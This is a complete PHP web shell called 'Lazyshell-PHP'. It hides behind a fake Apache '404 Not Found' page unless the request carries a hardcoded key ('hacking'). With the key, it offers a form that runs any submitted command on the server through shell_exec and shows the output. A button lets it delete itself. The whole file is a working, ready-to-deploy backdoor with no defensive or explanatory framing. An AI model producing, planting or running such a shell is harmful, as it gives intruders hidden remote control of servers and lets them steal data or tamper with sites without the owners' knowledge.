<?php
$secretkey = 'hacking';
$statuscode = 404;
$errorpagehtml = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at ' . $_SERVER['HTTP_HOST'] . ' Port ' . $_SERVER['SERVER_PORT'] . '</address>
</body></html>
';

// Ensure that all GET and GET parameter requirements have been satisfied before displaying the page or executing any shell commands.
if (isset($_POST['execute']) && !empty($_POST['command']) && $_GET['key'] == $secretkey) {
    $command = shell_exec($_POST['command']);
} elseif (isset($_POST['remove'])) {
    unlink(__FILE__);
    exit('Shell removed!');
}
if (isset($_GET["key"])) {
    if ($_GET["key"] != $secretkey) {
        http_response_code($statuscode);
        exit($errorpagehtml);
    }
} else {
    http_response_code($statuscode);
    exit($errorpagehtml);
}
?>

<!DOCTYPE html>
<html>

<head>
    <title>Lazyshell-PHP</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/darkly/bootstrap.min.css">
</head>

<body>
    <div class="container">
        <div class="mt-5 mb-4 row">
            <div class="col-sm-auto my-auto">
                <h1>Lazyshell-PHP</h1>
            </div>
            <div class="col-sm-auto my-auto">
                <form method="POST">
                    <button type="submit" class="btn btn-danger" name="remove" value="Remove">Remove Shell</button>
                </form>
            </div>
        </div>
        <form class="mb-3" method="POST">
            <div class="form-group">
                <label for="command">Command:</label>
                <input type="text" class="form-control mb-3" name="command" id="command" value="" required autofocus>
            </div>
            <button type="submit" class="btn btn-primary" name="execute" value="Execute">Execute</button>
        </form>
        <div class="pb-2 mt-5">
            <?php if (isset($command)) : ?>
                <pre class="pl-2 pr-2 small"><?php echo htmlspecialchars($command, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php elseif (!isset($command) && $_SERVER['REQUEST_METHOD'] == 'POST') : ?>
                <pre class="pl-2 pr-2 small">No results returned.</pre>
            <?php endif; ?>
        </div>
    </div>
</body>

</html>